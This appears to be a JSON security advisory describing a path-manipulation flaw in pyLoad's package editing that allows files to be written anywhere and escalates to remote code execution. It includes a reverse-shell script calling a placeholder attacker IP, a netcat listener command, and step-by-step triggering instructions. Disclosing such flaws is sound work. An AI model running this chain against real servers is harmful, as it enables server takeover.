  "summary": "Download to arbitrary folder can lead to RCE",
  "details": "### Summary\n\nA web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts.\n\n### Details\n\nWhen a user creates a new package, a subdirectory is created within the /downloads folder to store files. This new directory name is derived from the package name, except a filter is applied to make sure it can't traverse directories and stays within /downloads.\n\nsrc/pyload/core/api/__init__.py::add_package::L432\n\n```python\n  folder = (\n      folder.replace(\"http://\", \"\")\n      .replace(\"https://\", \"\")\n      .replace(\":\", \"\")\n      .replace(\"/\", \"_\")\n      .replace(\"\\\\\", \"_\")\n  )\n```\n\nSo if a package were created with the name ```\"../\"``` the application would instead create the folder ```\"/downloads/.._/\"```\n\nHowever, when editing packages there is no prevention in place and a user can just pick any arbitrary directory in the filesystem.\n\nsrc/pyload/webui/app/blueprints/json_blueprint.py::edit_package::L195\n\n```python\n  id = int(flask.request.form[\"pack_id\"])\n  data = {\n      \"name\": flask.request.form[\"pack_name\"],\n      \"_folder\": flask.request.form[\"pack_folder\"],\n      \"password\": flask.request.form[\"pack_pws\"],\n  }\n\n  api.set_package_data(id, data)\n```\n\n### Steps to reproduce\n\n1. Login to a pyLoad instance\n2. Go to \"Queue\" and create a new package with any name and a valid link\n3. Click \"Edit Package\" on the newly created package and set the folder as \"/config/scripts/download_finished/\"\n4. Restart the package \n5. Check the server filesystem and note the link was downloaded and stored inside \"/config/scripts/download_finished/\"\n\n### Remote code execution proof-of-concept\n\nIt is possible to use this issue to abuse scripts and gain remote control over the pyLoad server.\n\n#### On attacker machine\n\n1. Start a web server hosting a malicious script\n\n```bash\necho -e '#!/bin/bash\\nbash -i \u003e\u0026 /dev/tcp/\u003cattacker_ip\u003e/9999 0\u003e\u00261' \u003e evil.sh\u00261\nsudo python3 -m http.server 80\n```\n\n\n2. Start netcat listener for reverse shells\n\n  ```bash\n  nc -vklp 9999\n  ```\n\n#### On pyLoad\n\n1. Change pyLoad file permission settings\n\n    Change permissions of downloads: On\n    Permission mode for downloaded files: 0744\n\n2. Create a package with link pointing to the attacker\n\n    http://\u003cattacker_ip\u003e/evil.sh\n\n3. Edit package and change folder to /config/scripts/package_deleted/\n\n4. Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad\n\n5. Delete any package package to trigger the script\n\n### Impact\n\nAn authenticated user can gain control over the underlying pyLoad server.",
